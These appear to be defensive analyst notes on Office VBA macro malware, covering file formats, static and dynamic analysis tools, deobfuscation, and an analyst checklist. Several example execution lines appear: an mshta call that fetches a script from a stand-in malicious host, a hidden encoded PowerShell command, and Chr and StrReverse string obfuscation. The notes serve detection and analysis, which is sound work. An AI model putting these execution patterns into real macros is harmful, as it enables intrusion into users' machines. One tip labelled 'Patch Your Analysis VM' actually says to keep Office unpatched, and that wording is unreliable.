### Macros
A **macro** is a piece of code (written in VBA - Visual Basic for Applications) that automates repetitive tasks within Microsoft Office applications like Word, Excel, and PowerPoint.

- **Legitimate Use:** A user could record a macro to automatically format a document in a specific way, import data, or perform complex calculations.
- **Malicious Use (Macro Malware):** Cybercriminals write malicious macros. When an unsuspecting user opens a Word document and enables macros, the code executes. This code can download and install other malware, steal data, or take control of the system.

### The File Format

Modern Word documents (`.docx`, `.xlsx`, etc.) are essentially ZIP archives containing several XML files that define the document's text, styling, settings, and media. This is the "XML-like" structure you're referring to.

- When you create a macro in a Word document, the VBA code is stored inside this ZIP/XML structure in a separate project file.
- This means a perfectly normal-looking `.docx` file can secretly be a carrier for malicious code embedded within its structure.

### Core Microsoft 365 / Office Applications with VBA Support:

1. **Microsoft Excel**
2. **Microsoft Word**
3. **Microsoft PowerPoint**
4. **Microsoft Access** (Heavily relies on macros and VBA for automation and building applications)
5. **Microsoft Outlook** (Used for automating email, calendar, and contact tasks)
6. **Microsoft Publisher**
7. **Microsoft Visio** (Professional diagramming tool)

### Key Points to Remember:

- **File Extensions:** The tell-tale sign that a file _might_ contain macros is its file extension.
    
    - A file with an **`m`** at the end (e.g., `.docm`, `.xlsm`, `.pptm`) **definitely contains macros**.
    - A file with an `x` at the end (e.g., `.docx`, `.xlsx`, `.pptx`) should not contain macros, but it is possible for older file types or through exploits.
- **Security Warning:** Any of these applications will display a prominent **security warning** when opening a file containing macros, asking you to "Enable Content." You should only do this if you are absolutely certain the file is from a trusted source and you were expecting it.
- **Not All Support VBA:** Other Microsoft applications like **Microsoft Edge**, **OneNote**, and **Microsoft Teams** do not support VBA macros.

Here is a table for a clearer overview:

|Application Name|Primary Use|Macro-Enabled File Extension|Risk Level for Malware|
|---|---|---|---|
|**Microsoft Excel**|Spreadsheets & Data Analysis|`.xlsm`|Very High|
|**Microsoft Word**|Word Processing|`.docm`|Very High|
|**Microsoft PowerPoint**|Presentations|`.pptm`|High|
|**Microsoft Access**|Database Management|`.accdb` (can contain code)|High (can be used to run system commands)|
|**Microsoft Outlook**|Email & Calendar|N/A (Macros are stored in the client itself)|High (Can automate sending emails/data exfiltration)|
|**Microsoft Publisher**|Desktop Publishing|`.pub` (can contain code)|Medium|
|**Microsoft Visio**|Diagramming & Flowcharts|`.vsdm`|Medium|

---

### Phase 1: Initial Triage & Static Analysis

This phase is about examining the document without executing its code.

#### **Tools:**

1.  **oleid & oletools Suite:** The absolute go-to for initial analysis.
    *   **`oleid`**: Analyzes the file for common malicious indicators (Macros, suspicious streams, etc.). `oleid malicious.doc`
    *   **`olevba`**: Extracts and analyzes VBA macros. It shows the code and flags suspicious keywords (like `Shell`, `WScript.Shell`, `AutoOpen`). `olevba malicious.doc`
    *   **`oleobj`**: Extracts embedded objects (like Flash files, PDFs) from the document.
    *   **`rtfobj`**: Specifically for analyzing malicious RTF files.
    *   **Installation:** `pip install oletools`

2.  **OfficeMalScanner:** A powerful older tool that can scan the file structure, extract macros, and even brute-force the password on encrypted macros.
    *   `OfficeMalScanner malicious.doc scan`

3.  **Hex Editor (HxD, 010 Editor):** To manually inspect the file's binary structure, look for OLE2 headers, and find obfuscated strings.

4.  **Strings Utility (Sysinternals):** Extracts all human-readable strings from the binary file. Look for:
    *   VBA function names (`AutoOpen`, `Document_Open`)
    *   API calls (`kernel32`, `CreateProcess`)
    *   URLs, IP addresses, and file paths.
    *   Command: `strings.exe -accepteula malicious.doc > strings.txt`

5.  **7-Zip or any ZIP utility:** Remember, `.docx` is a ZIP archive. Rename `malicious.docx` to `malicious.zip` and extract it. Look inside the `word/vbaProject.bin` or other subfolders for interesting content.

#### **Important Tips for Static Analysis:**

*   **Look for Obfuscation:** Macros are almost always obfuscated. Look for:
    *   **Char Obfuscation:** `Chr(78) & Chr(101) & Chr(116)` instead of `"Net"`
    *   **String Reversal:** `StrReverse("tseT")`
    *   **Large amounts of variables** with meaningless names (`a1, b2, xyz`).
    *   The code will often decode itself in memory. Your goal is to find the deobfuscation routine.
*   **Identify the "Weaponization":** How is the macro triggered?
    *   `AutoOpen()`: Runs when the document is opened.
    *   `Document_Open()`: Same as above.
    *   `Workbook_Open()`: For Excel.
    *   Custom Subs/Functions called by these auto-triggers.
*   **Find the Payload:** What does the macro do? It usually follows a pattern:
    1.  **Deobfuscate** a string (a URL or a PowerShell command).
    2.  **Execute** it using a method like:
        *   `Shell("cmd.exe /c ...")`
        *   `WScript.Shell.Run(...)`
        *   **MSHTA:** `mshta http://malicious.site/script.hta`
        *   **Powershell:** The most common method. `PowerShell -WindowStyle Hidden -EncodedCommand <B64_Blob>`

---

### Phase 2: Dynamic Analysis (Behavioral Analysis)

This phase involves executing the macro in a controlled environment to see what it does.

#### **Tools:**

1.  **Process Monitor (ProcMon - Sysinternals):** The most critical tool. It logs all file system, registry, and process activity. Set filters for the process name (`WINWORD.EXE`) to see everything it touches.
2.  **Process Explorer (Sysinternals):** A superior Task Manager. See child processes spawned (e.g., `cmd.exe` -> `powershell.exe`). Verify digital signatures.
3.  **Wireshark / TCPdump:** Monitor all network traffic from the VM. See if the macro calls out to a C2 server to download the next-stage payload.
4.  **API Monitor (apimonitor.com):** Intercepts and logs API calls made by Office and any spawned processes. Great for seeing deep technical behavior.
5.  **REMnux:** A Linux distribution tailored for malware analysis. It contains all the tools mentioned here and many more, pre-installed. Perfect for running `inetsim` to simulate internet services.

#### **Important Tips for Dynamic Analysis:**

*   **Patch Your Analysis VM:** Office must be vulnerable for the exploit to work. If you're analyzing an exploit (not just a macro), ensure your Office version is old and unpatched to match the threat.
*   **Control Execution:** Use a debugger to step through the macro code if possible, though this is advanced.
*   **Focus on Child Processes:** The initial `WINWORD.EXE` process is harmless. The key is to catch the **child process** it spawns (e.g., `powershell.exe`, `cmd.exe`, `mshta.exe`). This is where the real payload runs.
*   **Capture the Payload:** The goal is to see what the macro downloads or drops. Use ProcMon to see the new file written to `%TEMP%` and then grab it for analysis.

---

### Phase 3: Advanced & Deobfuscation

1.  **Debugger (x64dbg/x32dbg):** For shellcode analysis if the document contains an exploit (e.g., CVE exploit) that drops shellcode into memory.
2.  **vivisect / libvmi:** For advanced memory analysis.
3.  **Custom Python Scripts:** The best way to deobfuscate. Use the `oletools` API to extract the VBA, parse the Abstract Syntax Tree (AST), and rewrite the code to resolve variables. Often, you can just run the deobfuscation function from the macro itself in a controlled Python script to get the clean output.

### The Analyst's Checklist:

1.  **Isolate:** Load the sample into your isolated VM.
2.  **Triage:** Run `oleid`, `olevba`, and `strings`. Get a quick feel for the threat.
3.  **Deobfuscate:** Manually or with scripts, try to decode the main payload (usually a PowerShell command).
4.  **Monitor:** Start ProcMon, Wireshark, and Process Explorer. Configure your filters.
5.  **Detonate:** Open the document and **enable macros**. Observe the tool outputs.
6.  **Capture:** Note any spawned processes, created files, and network connections. Retrieve the next-stage payload.
7.  **Document & Report:** Write down the IOC's (Indicators of Compromise): Hashes, IPs, URLs, domains, and the TTPs (Tactics, Techniques, and Procedures) used.


By using **[ViperMonkey](https://github.com/decalage2/ViperMonkey)** I was able to extract the VBA macros
ViperMonkey is a VBA Emulation engine written in Python, designed to analyze and deobfuscate malicious VBA Macros contained in Microsoft Office files (Word, Excel, PowerPoint, Publisher, etc).